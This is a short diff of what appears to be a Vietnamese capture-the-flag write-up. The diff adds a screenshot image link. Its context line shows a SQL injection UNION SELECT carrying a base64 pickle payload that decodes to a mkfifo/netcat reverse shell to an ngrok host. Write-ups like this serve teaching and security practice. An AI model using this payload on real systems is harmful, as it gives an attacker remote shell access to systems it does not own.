@@ -128,6 +128,8 @@ Gen lại payload với đoạn code bên trên:
 
 `'%20UNION%20SELECT%20'gASVcwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFhybSAtZiAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAwLnRjcC5hcC5uZ3Jvay5pbyAxNDc2OSA+L3RtcC9mlIWUUpQu'%20--`
 
+![image](https://user-images.githubusercontent.com/86275419/228033869-735f47bf-d0ed-4b0c-ba3f-cce5ad750f28.png)
+
 Result:
 
 ![image](https://user-images.githubusercontent.com/86275419/228033072-0e68bff4-2e5a-4470-ad3d-2b0d79d5eb9f.png)
